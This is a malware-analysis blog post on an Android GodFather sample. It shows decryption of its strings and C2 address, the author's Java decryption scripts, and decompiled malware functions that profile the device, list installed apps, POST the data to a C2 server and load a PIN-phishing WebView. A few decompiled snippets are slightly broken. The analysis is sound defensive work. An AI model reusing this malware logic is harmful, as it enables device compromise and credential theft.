---
title:  "GodFather Android Malware Analysis"
authors: ["Matteo Piciarelli"]
date:   2025-03-14
tags: ["Malware","Android"]
thumbnail:
  url: img/2025-03-14-godfather-android-analysis/godfather.png
  author: Ideogram
  authorURL: https://ideogram.ai/
---

GodFather is an Android malware that was first identified in mid 2023 and quickly attracted the attention of security experts because of its advanced capabilities and modular structure.
Its design highlights a significant evolution from its predecessors, exploiting sophisticated techniques to circumvent security measures and infect Android devices.


In this article, we will explore how this version of the malware communicates with the C2 server, a critical component that allows attackers to manage the malware in real time and receive stolen data. We will also analyze GodFather’s use of Shared Preferences to store important data locally on the infected device, making it more difficult to detect and delete the collected information.

## APK Overview

Looking for the SHA-256 of the apk on [VirusTotal](https://www.virustotal.com/gui/file/20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3), we immediately notice that it is already reported as malicious by several security vendors.

{{< image src="img/2025-03-14-godfather-android-analysis/img1.png" caption="Figure 1 - VirusTotal" wrapper="text-center">}} 

The application bundle contains several files, the **app.xml** file contained in the shared_prefs looks interesting (it will be explained later).

{{< image src="img/2025-03-14-godfather-android-analysis/img2.png" caption="Figure 2 - Bundle details" wrapper="text-center">}} 

The domain (which will be explained later in the article) also turns out to be malicious.

{{< image src="img/2025-03-14-godfather-android-analysis/img3.png" caption="Figure 3 - VirusTotal2" wrapper="text-center">}} 

## New Version of GodFather

The first thing one notices upon examining the apk is the absence of an anti-emulator check unlike the samples analyzed by [muha2xmad](https://muha2xmad.github.io/malware-analysis/godfather) and [group-ib](https://www.group-ib.com/blog/godfather-trojan/).

### Step1 : Encrypted strings

The strings in the application appear to be encrypted, in fact in the following image you can see some of the encrypted strings used by the malware.

{{< image src="img/2025-03-14-godfather-android-analysis/img4.png" caption="Figure 4 - BuildConfig" wrapper="text-center">}} 

The class that deals with decrypt these strings is **effluvias**.

{{< image src="img/2025-03-14-godfather-android-analysis/img5.png" caption="Figure 5 - Effluvias Class" wrapper="text-center">}} 

This function decrypts a base64 text using the AES algorithm in CBC mode with PKCS5 padding.


Using JAVA, it is possible to reproduce the reverse mechanism to decipher the strings in the apk. Below is the code used to decipher the strings.


```Java
import java.util.Base64;
import java.util.Arrays;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
 
public class DecryptionExample {
    
    public static void main(String[] args) {
        // Check args
        if (args.length == 0) {
            System.out.println("Inserisci il testo cifrato.");
            System.exit(1);
        }
 
        String encryptedText = args[0];
 
        String decryptedText = effluvias(encryptedText);
        
        if (decryptedText != null) {
            System.out.println("Decrypted text: " + decryptedText);
        } else {
            System.out.println("Failed to decrypt text");
        }
    }
 
    public static String effluvias(String ciphertext) {
        try {
            byte[] cipherbytes = Base64.getDecoder().decode(ciphertext);
            byte[] initVector = Arrays.copyOfRange(cipherbytes, 0, 16);
            byte[] messagebytes = Arrays.copyOfRange(cipherbytes, 16, cipherbytes.length);
            IvParameterSpec iv = new IvParameterSpec(initVector);
            SecretKeySpec skeySpec = new SecretKeySpec("B9M80O2RAK1VRJNV".getBytes(StandardCharsets.UTF_8), "AES");
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
            cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
            byte[] byte_array = cipher.doFinal(messagebytes);
            return new String(byte_array, StandardCharsets.UTF_8);
        } catch (Exception ex) {
            ex.printStackTrace();
            return null;
        }
    }
}
```

With the script it was possible create a full list of Encrypted and Decrypted String, https://github.com/phemt91/GodFather_String.git 

### Step2 : C2 Communication

Having installed the apk in the emulator, it was possible to start observing its behavior. Regarding network calls, we can see an attempt to connect to the first  in the image below:

{{< image src="img/2025-03-14-godfather-android-analysis/img6.png" caption="Figure 6 - Http Request" wrapper="text-center">}} 

Examining the code we find references to it:

{{< image src="img/2025-03-14-godfather-android-analysis/img7.png" caption="Figure 7 - VirusTotal" wrapper="text-center">}} 

Using the script to decipher the strings in fact we find that:

```
o7lGWUU/28+5RpweyMuUGihsbHNkfHAHwgyycKpQfBmF6MkVSa58Dvr6WU6eFxLJ:https://t[.]me/famokorapisoram
```

{{< image src="img/2025-03-14-godfather-android-analysis/img8.png" caption="Figure 8 - VirusTotal" wrapper="text-center">}} 

The string also appears to be encrypted, plus we find that this particular string is also present in the Shared Preference:

```XML
<string name="min">zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==</string>
```

Continuing the analysis we find that:

{{< image src="img/2025-03-14-godfather-android-analysis/img9.png" caption="Figure 9 - VirusTotal" wrapper="text-center">}} 

Contextualizing them: 

#### Hagiography

The function takes a Base64-encoded string, decodes it into a byte array, assigns the decoded byte array to a global variable called cremosin, and returns the decoded string.

```Java
    public static String hagiography(String c) {
        cremosin = new byte[0];
        byte[] decode = Base64.decode(c.getBytes(StandardCharsets.UTF_8), 0);
        cremosin = decode;
        return new String(decode);
    }
```

#### Uriiah

The function is designed to encrypt a string s using a symmetric encryption algorithm (presumably Blowfish) with a secret key set “ABC”

```Java
public static String Uriiah(String s) {
        String effluvias = ("Blowfish");
        try {
            return samariums(s, new SecretKeySpec(("ABC").getBytes(), effluvias), Cipher.getInstance(effluvias));
        } catch (Exception e) {
            return HttpUrl.FRAGMENT_ENCODE_SET;
        }
    }
```

#### Samariums
This function takes a Base64-encoded string, decrypt it using a symmetric encryption algorithm with a secret key and a specific IV, returning the decrypted string.

```Java
public static String samariums(String s, SecretKeySpec sec, Cipher c) throws InvalidAlgorithmParameterException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException {
        try {
            byte[] val = Base64.decode(s, 0);
            c.init(2, sec, new IvParameterSpec(("abcdefgh").getBytes()));
            return new String(c.doFinal(val));
        } catch (Exception e) {
            return HttpUrl.FRAGMENT_ENCODE_SET;
        }
    }
```

Starting with this information, it was possible to create a script that would allow us to decipher the string:

```Java
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
 
public class DecryptionScript {
 
    public static void main(String[] args) {
        String encryptedString = "zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==";
        String decryptedString = decrypt(encryptedString);
        System.out.println("Decrypted String: " + decryptedString);
    }
 
    public static String decrypt(String encryptedString) {
        try {
            String decrypted = Uriiah(encryptedString);
            return decrypted;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
 
    public static String Uriiah(String s) {
        String effluvias = AnnotationHttp.effluvias("Blowfish");
        try {
            return samariums(s, new SecretKeySpec(AnnotationHttp.effluvias("ABC").getBytes(), effluvias), Cipher.getInstance(effluvias));
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
 
public static String samariums(String s, SecretKeySpec sec, Cipher c) throws Exception {
    byte[] val = Base64.getDecoder().decode(s);
    c.init(Cipher.DECRYPT_MODE, sec);
    return new String(c.doFinal(val), StandardCharsets.UTF_8);
}
 
    // Dummy class for AnnotationHttp
    static class AnnotationHttp {
        public static String effluvias(String s) {
            // Dummy implementation
            return s;
        }
    }
}
```

It returns the following url:

https://yukoramparata[.]top/zamra/aaa/

{{< image src="img/2025-03-14-godfather-android-analysis/img10.png" caption="Figure 10 - VirusTotal" wrapper="text-center">}} 

Analyzing the endpoint on VirusTotal it was found to be malicious: 


{{< image src="img/2025-03-14-godfather-android-analysis/img11.png" caption="Figure 10 - Decrypted String" wrapper="text-center">}} 

### Step3 : Shared Preference and Talking with C2

When the application starts, a file called app.xml is created inside the shared preferences, containing several pieces of information: 


```Java


<?xml version='1.0' encoding='utf-8' standalone='yes' ?> 

<map> 

    <string name="acb">false</string> 
    <string name="aox">UGxheSBTdG9yZQ</string> 
    <string name="sy2">false</string> 
    <string name="notification">UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiB0byB1c2UgdGhlIGFwcGxpY2F0aW9uLg</string> 
    <string name="btck">false</string> 
    <string name="onb2">false</string> 
    <string name="tag">MDQwMUVO</string> 
    <string name="giflink">aHR0cHM6Ly9zNS5naWZ5dS5jb20vaW1hZ2VzL1M4QWg2LmdpZg</string> 
    <string name="opc">0</string> 
    <string name="messagex">QSBuZXcgdmVyc2lvbiBvZiBvdXIgYXBwbGljYXRpb24gaXMgYXZhaWxhYmxlLiBUbyB1cGRhdGUsIGdvIHRvIFBsYXkgU3RvcmUu</string> 
    <string name="oph">false</string> 
    <string name="cdm2">reee</string> 
    <string name="alt">com.melting.mantaught|||</string> 
    <string name="opi">false</string> 
    <string name="ull1">Rm9yY2Ugc3RvcA</string> 
    <string name="ull2">dG8gcmVtb3Zl</string> 
    <string name="lowbattery">TG93IEJhdHRlcnk</string> 
    <string name="xau">false</string> 
    <string name="cdm">reee</string> 
    <string name="opo">false</string> 
    <string name="toast">UGxlYXNlIGdyYW50IGFjY2Vzc2liaWxpdHkgcGVybWlzc2lvbiBmb3IgdGhlIGFwcGxpY2F0aW9uIHRvIHJ1bi4</string> 
    <string name="dsd">none</string> 
    <string name="boa">QWxsb3c</string> 
    <string name="btry">0</string> 
    <string name="device">2</string> 
    <string name="accs">false</string> 
    <string name="psd">falsefalse</string> 
    <string name="allow">QWxsb3c</string> 
    <string name="rbt">false</string> 
    <string name="fss">false</string> 
    <string name="aduration">1500</string> 
    <string name="locale">en</string> 
    <string name="sb">0</string> 
    <string name="duration">500</string> 
    <string name="titlex">SW5mb3JtYXRpb24</string> 
    <string name="bs">0</string>
    <string name="smm">13 A50</string> 
    <string name="forwading">Y29tLmxtci5sZm0</string> 
    <string name="min">zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==</string> 
    <string name="ka">false</string> 
    <string name="logsender">0</string> 
    <string name="onb">false</string> 
    <string name="restart">cmVzdGFydA</string> 
    <string name="ullh">Rk9SQ0UgU1RPUA</string> 
    <string name="sy">false</string> 
    <string name="infobig">UGxlYXNlIGdyYW50IHRoZSBwZXJtaXNzaW9uIHNob3duIGFib3ZlIGZvciB0aGUgYXBwbGljYXRpb24gdG8gcnVuLg</string> 
    <string name="again">UGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4</string> 
    <string name="ntr">true</string> 
    <string name="ullp">Rm9yY2Ugc3RvcA</string> 
    <string name="ky">0hh2fpkr5zt72</string> 
    <string name="permistoast">WW91IGNhbm5vdCB1c2UgdGhlIGFwcGxpY2F0aW9uIHdpdGhvdXQgZ2l2aW5nIHRoZSBuZWNlc3NhcnkgcGVybWlzc2lvbi4</string> 
    <string name="aso">false</string> 
    <string name="pl">0</string> 

</map> 
```

Analyzing the wide variety of data, a question was asked: What are these strings? What are they used for? 

The main functions involved in reading and writing Shared Preference are Bedamend and Sandrakottos: 


#### Bedamned 

{{< image src="img/2025-03-14-godfather-android-analysis/img12.png" caption="Figure 12 - Bedamned Class" wrapper="text-center">}} 


The function retrives data from SharedPreference: 
Opens the sharedpreference called “app” (app.xml) and return the string associated with key n from the SharedPreferences. 



If the key does not exist, it returns a default value. 

```Java

   public static String bedamned(Context context, String n) { 
        SharedPreferences s = context.getSharedPreferences(("app"); 
        return s.getString(n, HttpUrl.FRAGMENT_ENCODE_SET); 
    } 


```


#### Sandrakottos 

{{< image src="img/2025-03-14-godfather-android-analysis/img13.png" caption="Figure 13 - Sandrakottos Class" wrapper="text-center">}} 


The function writes data to shared preference, inserts the key-value paur (n,p) into the SharedPreferences 


```Java

     public static void Sandrakottos(Context context, String n, String p) { 

        SharedPreferences s = context.getSharedPreferences(("app"), 0); 

        SharedPreferences.Editor e = s.edit(); 

        e.putString(n, p); 

        e.apply(); 

    } 
```



Having found the function that read and write the share preferences, it was possibile to proceed to the examination of the main functions that write and read data from the shared Preferences: 


#### Champaka

{{< image src="img/2025-03-14-godfather-android-analysis/img14.png" caption="Figure 14 - Champaka Class" wrapper="text-center">}} 


The function generates a random string, which will then be used as the identifier of the device on which the malware is installed, to communicate with the c2 (we will see in the appropriate section).
The function take the length of the string “a” as parameter.
The created string will contain numbers from 0 to 9 and lowercase letters from a to z without w and x.

```Java

   public static String champaka(int l) {
        String a = ("0123456789")+("abcdefghijklmpqrstuvyz").toLowerCase();
        StringBuilder s = new StringBuilder(l);
        for (int i = 0; i < l; i++) {
            int in = (int) (a.length() * Math.random());
            s.append(a.charAt(in));
        }
        return s.toString();
    }

```

#### Undissuadably


{{< image src="img/2025-03-14-godfather-android-analysis/img15.png" caption="Figure 15 - Undissuadably Class" wrapper="text-center">}} 


It Initializes an OkHttpClient  object with different timeouts, constructs a FormBody using the parameters provided in the HashMap. Creates and sends HTTP POST request with the parameters.
If the response is valid and contains the string “Injection”,it  processes the response further, splits the result and invokes several functions, some of which appears to store values in SharedPreferences. Then it stores the result in the “obtainal” key.

```Java

public static String undissuadably(final Context context, String url, HashMap<String, String> params) {
    try {
        fiddlebow = new OkHttpClient();
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        fiddlebow = builder
            .connectTimeout(50L, timeUnit)
            .writeTimeout(50L, timeUnit)
            .readTimeout(50L, timeUnit)
            .callTimeout(50L, timeUnit)
            .build();
        
        final FormBody.Builder builder2 = new FormBody.Builder();
        nonstylized = builder2;
        Objects.requireNonNull(builder2);
        
        params.forEach(new BiConsumer<String, String>() {
            @Override
            public void accept(String key, String value) {
                builder2.add(key, value);
            }
        });
        
        spekboom = nonstylized.build();
        
        Request build = new Request.Builder()
            .addHeader("Content-Type", "text/plain; charset=utf-8")
            .addHeader("Connection", "close")
            .url(url)
            .post(spekboom)
            .build();
        
        Custer = build;
        
        fiddlebow.newCall(build).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
            }
 
            @Override
            public void onResponse(Call call, Response response) throws IOException {
                String effluvias = "cn";
                if (response.isSuccessful()) {
                    try {
                        String res = response.body().string();
                        veepees.obtainal = res;
                        try {
                            if (!res.isEmpty()) {
                                veepees.obtainal = Tamarix.Uriiah(res);
                            }
                        } catch (Exception e) {
                        }
                        if (!Tamarix.bedamned(context, effluvias).contains(veepees.obtainal)) {
                            if (veepees.obtainal.contains("Injection")) {
                                String[] split = veepees.obtainal.trim().split(":");
                                veepees.tautologys = split;
                                try {
                                    rawedged.runtiest(context, split[8]);
                                } catch (Exception e2) {
                                }
                                try {
                                    rawedged.reexpressing(context, veepees.tautologys[11]);
                                } catch (Exception e3) {
                                }
                                try {
                                    Tamarix.Sandrakottos(context, "dsd", veepees.tautologys[13]);
                                } catch (Exception e4) {
                                }
                                try {
                                    Context context2 = context;
                                    String[] strArr = veepees.tautologys;
                                    rawedged.hyperemetic(context2, strArr[14], strArr[15]);
                                } catch (Exception e5) {
                                }
                                try {
                                    Tamarix.Sandrakottos(context, "psd", veepees.tautologys[22]);
                                } catch (Exception e6) {
                                }
                                try {
                                    Besant.sublibrarianship(context, veepees.tautologys[21]);
                                } catch (Exception e7) {
                              
                                }
                                Tamarix.Sandrakottos(context, "is", veepees.tautologys[1]);
                            }
                            Tamarix.Sandrakottos(context, effluvias, res);
                        }
                    } catch (Exception e8) {
                 
                    }
                }
            }
        });
        return HttpUrl.FRAGMENT_ENCODE_SET;
    } catch (Exception e) {
        return HttpUrl.FRAGMENT_ENCODE_SET;
    }
}


```

#### Spellican


{{< image src="img/2025-03-14-godfather-android-analysis/img16.png" caption="Figure 16 - Spellican Class" wrapper="text-center">}} 


This function creates an OkHttpClient.Builder. 
It configures the timeouts for connect, write, read, and total call to 50 seconds each.
Convert the response body to a string using a regex to search for a specific meta tag with property=”og:description” and capture the contents of the tag.
For each occurrence found by the regex, call the Sandrakottos method to save the content in the SharedPreferences under the key “min”.


{{< image src="img/2025-03-14-godfather-android-analysis/img17.png" caption="Figure 17 - SharedPrefrence Reference" wrapper="text-center">}} 
Which, in fact, turns out to be the C2 string analyzed earlier.


```Java

public static void spellican(String url, Context context) throws IOException {
        OkHttpClient.Builder builder = new OkHttpClient.Builder();
        TimeUnit timeUnit = TimeUnit.SECONDS;
        OkHttpClient client = builder.connectTimeout(50L, timeUnit).writeTimeout(50L, timeUnit).readTimeout(50L, timeUnit).callTimeout(50L, timeUnit).build();
        Request request = new Request.Builder().url(url).addHeader(("User-Agent"), ("Mozilla/5.0 (Linux; Android 10; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Safari/537.36")).build();
        try {
            Response response = client.newCall(request).execute();
            if (!response.isSuccessful()) {
                throw new IOException(("Unexpected code") + response);
            }
            String tele = response.body().string();
            Pattern pattern = Pattern.compile(('<meta property=\"og:description\" content=\"(.*?)\">'), 32);
            Matcher matcher = pattern.matcher(tele);
            while (matcher.find()) {
                Sandrakottos(context, ("min"), matcher.group(1));
            }
            response.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


```

#### Rarefeatured

{{< image src="img/2025-03-14-godfather-android-analysis/img18.png" caption="Figure 18 - Rarefeatured Class" wrapper="text-center">}} 

This function prepares and sends an http request.
This function is confusing because it uses two variables called effluvias and effluvias2 with values “alt” and “ky” respectively, ( Effluvias is the same name as the function that is used to decipher strings). 
A URL is constructed by concatenating the result of the Uriiah method applied to the result of the bedamned method with the key “min” and the string “callnew.php”.
On the Shared Preference we can see

```Java

<string name="min">zH7cPW3ZEHjVTG9k7cxAEFPMXyfMjJ9RsvkyHSqCvNV5HAZ/FWvMgQ==</string>
```
Deciphered with Uriiah function give us:
https://yukoramparata[.]top/zamra/aaa/ , adding the string “callnew.php”: 
https://yukoramparata[.]top/zamra/aaa/callnew.php


The rarefeatured function appears to prepare and send an HTTP POST request including a set of data retrieved from the SharedPreference

```Java

    public static void rarefeatured(Context context, String e) {
    public static void rarefeatured(Context context, String e) {
        String effluvias = ("alt");
        String effluvias2 = ("ky");
        try {
            HashMap<String, String> p = new HashMap<>();
            p.put(effluvias2, bedamned(context, effluvias2));
            p.put(("tg"), hagiography(bedamned(context, ("tag"))));
            p.put(("cy"), bedamned(context, ("locale")));
            p.put(("model"), bedamned(context, ("smm")));
            p.put(("nw"), ("true"));
            p.put(effluvias, bedamned(context, effluvias));
            p.put(("eys"), e);
            p.put(("rpn"), bedamned(context, ("psv")));
            veepees.undissuadably(context, Uriiah(bedamned(context, ("min"))) + ("callnew.php"), p);
        } catch (Exception e2) {
        }
    }
```

|  |  |
| --- | --- |
|alt    | com.melting.mantaught |
|tg     | 0401EN                |
|cy     | en                    |
|model  | 13 A50                |
|nw     | true                  |
|ky     | 0hh2fpkr5zt72         |

#####

Checking the requests from our device proxy:


{{< image src="img/2025-03-14-godfather-android-analysis/img19.png" caption="Figure 19 - Http Request" wrapper="text-center">}} 


### Step4 : Retrieve Shared Preference and Talking with C2

The data it sends is all data that this malware retrieves in different ways, specifically:


#### JJ

{{< image src="img/2025-03-14-godfather-android-analysis/img20.png" caption="Figure 20 - JJ class" wrapper="text-center">}} 

The JJ function collects device information (manufacturer and model) and sends a specific code associated with these details using a call to Tamarix. Sandrakottos. 
This could be used to keep track of the type of device that is using the app or to send specific information to the app server for device management or profiling.
Ex. Using an emulator for analysis is returned the value device 2

{{< image src="img/2025-03-14-godfather-android-analysis/img21.png" caption="Figure 21 - Shared Preference Detail" wrapper="text-center">}} 


```Java

public static void JJ(Context context) {
    String r;
    String d = Build.MANUFACTURER + Build.MODEL;
 
    if (d.contains("HUAWEI")) {
        r = "0";
    } else if (d.contains("Pixel")) {
        r = "1";
    } else if (d.substring(0, 2).contains("LG")) {
        r = "3";
    } else if (d.contains("Xiaomi")) {
        r = "5";
    } else if (d.contains("OPPO") || d.contains("CPH")) {
        r = "4";
    } else {
        r = "2";
    }
 
    Tamarix.Sandrakottos(context, "device", r);

```

#### Untraffickable

{{< image src="img/2025-03-14-godfather-android-analysis/img22.png" caption="Figure 22 - Untraffickable Class" wrapper="text-center">}} 

It checks if the device is of a certain type (device equals “4”) via the Tamarix.bedamned.
If true, it sets a value of “true” in the context with the key “opi”.
Gets the intent and retrieve two values (str and id) passed through the intent. 
If str is not null or empty, it sets a value “true” in the context with the key “rbt”.
Configure a WebView with JavaScript enabled and a specific User-Agent.
Extends WebViewClient and handles web page loading events. 
The method onPagefinished: if the URL contains “STOP”, it performs a series of actions:
•   Loads a blank page (About:blank)
•   Updates some keys in the context with new values.
•   Finish the activity. (finish)
•   Extends webChromeClient
•   Handles JavaScript Alert (onJsAlert)
Otherwise, it checks the device type again and updates the keys in the context with “false” value. 
This function returns false when the “back” button is pressed


```Java

public class untraffickable extends Activity {
    private static String prevailed;
 
    @Override
    @SuppressLint({"SetJavaScriptEnabled"})
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
    }
 
    @Override
    public void onStart() {
        super.onStart();
        boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias("device")).equals(cirrofilum.effluvias("4"));
        String effluvias = cirrofilum.effluvias("true");
        if (equals) {
            Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias("opi"), effluvias);
        }
        Intent intent = getIntent();
        String str = intent.getStringExtra(cirrofilum.effluvias("str"));
        prevailed = intent.getStringExtra(cirrofilum.effluvias("id"));
        if (!str.equals(HttpUrl.FRAGMENT_ENCODE_SET) || str != null) {
            Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias("rbt"), effluvias);
            WebView wv = new WebView(this);
            wv.getSettings().setJavaScriptEnabled(true);
            wv.getSettings().setUserAgentString(cirrofilum.effluvias("Mozilla/5.0 (Linux; Android 9; SM-J730F Build/PPR12.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"));
            wv.setWebViewClient(new MyWebViewClient());
            wv.setWebChromeClient(new MyWebChromeClient());
            wv.loadUrl(Tamarix.Uriiah(Tamarix.bedamned(this, cirrofilum.effluvias("min"))) + cirrofilum.effluvias("rx/f.php?f=") + str + cirrofilum.effluvias("&p=") + Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias("ky")) + cirrofilum.effluvias("|") + Locale.getDefault().getLanguage().toLowerCase());
            setContentView(wv);
        }
    }
 
    public class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageFinished(WebView view, String url) {
            if (url.contains(cirrofilum.effluvias("STOP"))) {
                view.loadUrl(cirrofilum.effluvias("about:blank"));
                Context applicationContext = untraffickable.this.getApplicationContext();
                String effluvias = cirrofilum.effluvias("is");
                String rep = Tamarix.bedamned(applicationContext, effluvias);
                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), effluvias, rep.replace(untraffickable.prevailed, HttpUrl.FRAGMENT_ENCODE_SET));
                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias("opo"), cirrofilum.effluvias("true"));
                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias("psv"), cirrofilum.effluvias("0"));
                Tamarix.Sandrakottos(untraffickable.this.getApplicationContext(), cirrofilum.effluvias("rbt"), cirrofilum.effluvias("false"));
                untraffickable.this.finish();
            }
        }
 
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }
    }
 
    public class MyWebChromeClient extends WebChromeClient {
        @Override
        public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
            return true;
        }
    }
 
    @Override
    public void onStop() {
        super.onStop();
        boolean equals = Tamarix.bedamned(getApplicationContext(), cirrofilum.effluvias("device")).equals(cirrofilum.effluvias("4"));
        String effluvias = cirrofilum.effluvias("false");
        if (equals) {
            Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias("opi"), effluvias);
        }
        Tamarix.Sandrakottos(getApplicationContext(), cirrofilum.effluvias("rbt"), effluvias);
    }
 
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
 
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        return false;
    }
 
    @Override
    public void onBackPressed() {
        super.onBackPressed();
    }
}

```



Analyzing the “construction” of the url will be:
Within the method wv.loadrl:



```Java

wv.loadUrl(
    Tamarix.Uriiah(Tamarix.bedamned(this, "min")) + 
    "rx/f.php?f=" + str + 
    "&p=" + Tamarix.bedamned(getApplicationContext(), "ky") + 
    "|" + Locale.getDefault().getLanguage().toLowerCase()
);


```
Tamarix.Uriiah(Tamarix.bedamned(this, "min")):
Uriiah method takes a value obtained from Tamarix.bedamned(this, "min") and returns a fixed part of the URL.
So https://yukoramparata[.]top/zamra/aaa/
"rx/f.php?f=" + str: adds the parameters “f” with the value obtained from the intent (str).
"&p=" + Tamarix.bedamned(getApplicationContext(), "ky"): adds the parameter “p” with a value obtained from  Tamarix.bedamned.

"|" + Locale.getDefault().getLanguage().toLowerCase(): Adds the device language as a parameter in the URL.
The parameters str and id could be generated by speculatd function (in detalis below).
Below the code of the speculated function


```Java

                        Intent dialogIntent = new Intent(ctx, untraffickable.class)
                            .putExtra("str", "ALL_PIN")
                            .putExtra("id", "1500");



```

The result:
https://yukoramparata[.]top/zamra/aaa/rx/f.php?f=ALL_PIN&p=0hh2fpkr5zt72|en




#### Speculated

{{< image src="img/2025-03-14-godfather-android-analysis/img23.png" caption="Figure 23 - Speculated Class" wrapper="text-center">}} 

The function gets an instance of KeyguardManager, it checks whether the device is locked using the isKeyguardLocked() 
If the device is not locked (locked is false), the function creates a Timer object. 
It defines an anonymous TimerTask that performs a periodic task 


```Java

public static void speculated(final Context ctx) {
    KeyguardManager km = (KeyguardManager) ctx.getSystemService("keyguard");
    boolean locked = km.isKeyguardLocked();
    if (!locked) {
        try {
            final Timer timerObj = new Timer();
            TimerTask timerTask = new TimerTask() {
                @Override
                public void run() {
                    if (Tamarix.bedamned(ctx, "opi").contains("false")) {
                        String bedamned = Tamarix.bedamned(ctx, "opo");
                        String effluvias = "true";
                        if (bedamned.contains(effluvias)) {
                            Besant.mismoving.cancel();
                            timerObj.cancel();
                            Tamarix.Sandrakottos(ctx, "oph", effluvias);
                            return;
                        }
                        Intent dialogIntent = new Intent(ctx, untraffickable.class)
                            .putExtra("str", "ALL_PIN")
                            .putExtra("id", "1500");
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        ctx.startActivity(dialogIntent);
                    }
                }
            };
            mismoving = timerTask;
            timerObj.schedule(timerTask, 0L, 2000L);
        } catch (Exception e) {
        }
    }
}

```


{{< image src="img/2025-03-14-godfather-android-analysis/img24.png" caption="Figure 24 - Shared Preference detail" wrapper="text-center">}} 



#### Osnabruck

{{< image src="img/2025-03-14-godfather-android-analysis/img25.png" caption="Figure 25 - Osnabruck Class" wrapper="text-center">}} 

In this function a “bowfin” string is initialized with the value, representing an empty string or URL escape character.
A loop is run through the list of installed applications obtained through the PackageManager.
For each PackageInfo in the list:
1.  If the Flag_System flag of the application is disable (indicating that the application is non-system), 
2.  the application package name is added to the bowfin string, followed by |||.
At the end, the bowfin string is passed to the Sandrakottos function.

```Java

   public static String Osnabruck(Context context) {
        bowfin = HttpUrl.FRAGMENT_ENCODE_SET;
        try {
            List<PackageInfo> b = context.getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < b.size(); i++) {
                PackageInfo p = b.get(i);
                ApplicationInfo applicationInfo = p.applicationInfo;
                if ((applicationInfo.flags & 1) == 0) {
                    String a = applicationInfo.packageName;
                    bowfin += a + ("|||");
                }
            }
            Tamarix.Sandrakottos(context, ("alt"), bowfin);
        } catch (Exception e) {
        }
        return bowfin;
    }


```

Tamarix.Sandrakottos(context, ("alt"), bowfin);

In the shared preference we can see:

{{< image src="img/2025-03-14-godfather-android-analysis/img26.png" caption="Figure 26 - Shared Preference detail" wrapper="text-center">}} 


That is because we use a New Emulator with no application installed.


#### Malacostraca


{{< image src="img/2025-03-14-godfather-android-analysis/img27.png" caption="Figure 27 - Malacostraca Class" wrapper="text-center">}} 

This function retrieves the value associated with the key “ky” from the SharedPreference. 

 

It Inserts an addition parameter with key “ick” and value “true” into the params map, 

retrieves the value associated with key “min” from the shared preferences using the bedamned method. 

After that it passes the retrived value to the Uriiah function to obtain the base URL. 

Adds “call.php” to the obtained base url. 

Call undissuadably method to perform an HTTP POST request to this URL with the params. 

{{< image src="img/2025-03-14-godfather-android-analysis/img28.png" caption="Figure 28 - Request Http" wrapper="text-center">}} 

```Java

public static void Malacostraca(Context context) {
    String effluvias = "ky";
    try {
        HashMap<String, String> params = new HashMap<>();
        
        params.put(effluvias, bedamned(context, effluvias));
        
        params.put("ick", "true");
        
        String url = Uriiah(bedamned(context, "min")) + "callnew.php";
        
        veepees.undissuadably(context, url, params);
    } catch (Exception e) {
    }
}

```


## Conclusion

Analysis of some of GodFather's features provided insight into its capabilities and operation.  
Here are the key points that emerged from our analysis: 

•   C2 communication: GodFather uses encrypted communication with the command-and-control server to send stolen data and receive commands. This two-way channel allows attackers to manage the infection in real time, updating the malware with new instructions or exfiltrating additional data without raising suspicion. 
•   Using Shared Preferences: The malware exploits Android's Shared Preferences to store critical information, such as login details or temporary keys. This technique allows GodFather to retain data even after a device reboot, maintaining persistence and making it easier to retrieve the information for later use.


## Indicator of Compromise

|  |  |
| --- | --- |
|App Name |Chrome.apk|
|Package Name |  com.melting.mantaught |
|Sha256  | 20116083565a50f6b2db59011e9994e9a9f5db5994703d53233b8b202a5ad2f3  |
|Telegram Channel |   https://t[.]me/famokorapisoram  |
|C2 Server |  https://yukoramparata[.]top/zamra/aaa/ |


## List of quick reference of function

| Function Name | Description |
| --- | --- |
